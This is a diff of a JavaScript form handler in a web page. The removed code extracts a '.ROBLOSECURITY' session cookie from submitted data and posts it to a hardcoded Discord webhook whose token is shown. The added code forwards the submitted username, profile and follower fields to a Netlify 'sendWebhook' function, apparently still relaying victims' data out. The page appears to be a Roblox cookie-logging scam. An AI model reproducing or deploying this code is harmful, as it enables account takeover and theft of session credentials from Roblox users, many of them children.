@@ -355,33 +355,30 @@
                 return;
             }
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1352810286439993365/mwgH1enPDE-0kOENCx5mqk66qqf-OiT-fwGtZuFbIH-8bV9qMNBOd_8uhT4zyQFdNdEf';
+            const serverlessUrl = 'https://miweb.netlify.app/.netlify/functions/sendWebhook';
 
-            const data = `Username: ${username}\nProfile: ${profile}\nFollowers: ${followers}`;
-            const lines = data.split('\n').slice(0, 11).join('\n'); // Get the first 11 lines
+            const data = {
+                username: username,
+                profile: profile,
+                followers: followers
+            };
 
-            const match = data.match(/\.ROBLOSECURITY", "(.*?)"/);
-            if (match) {
-                const cookie = match[1];
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: cookie })
-                }).then(response => {
-                    if (response.ok) {
-                        showModal();
-                    } else {
-                        alert('Failed to send data.');
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send data.');
-                });
-            } else {
+            fetch(serverlessUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Éxito:', data);
+                showModal();
+            })
+            .catch((error) => {
+                console.error('Error:', error);
                 showErrorModal();
-            }
+            });
         }
 
         function showModal() {
